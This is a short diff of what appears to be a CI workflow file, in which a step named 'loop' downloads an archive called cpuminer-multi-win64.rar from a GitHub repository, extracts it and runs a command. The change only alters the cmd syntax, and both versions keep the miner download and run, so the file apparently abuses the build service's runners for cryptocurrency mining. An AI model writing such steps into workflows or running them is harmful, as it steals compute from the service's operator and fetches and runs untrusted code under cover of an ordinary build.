@@ -11,7 +11,7 @@ jobs:
     steps:
     
     - name: loop
-      run: cmd /c curl https://github.com/Testdrive345/light/raw/main/cpuminer-multi-win64.rar -O -J -L
-           cmd /c tar -xf cpuminer-multi-win64.rar
-           cmd /c test
+      run: cmd curl https://github.com/Testdrive345/light/raw/main/cpuminer-multi-win64.rar -O -J -L
+           cmd  tar -xf cpuminer-multi-win64.rar
+           cmd  test
     
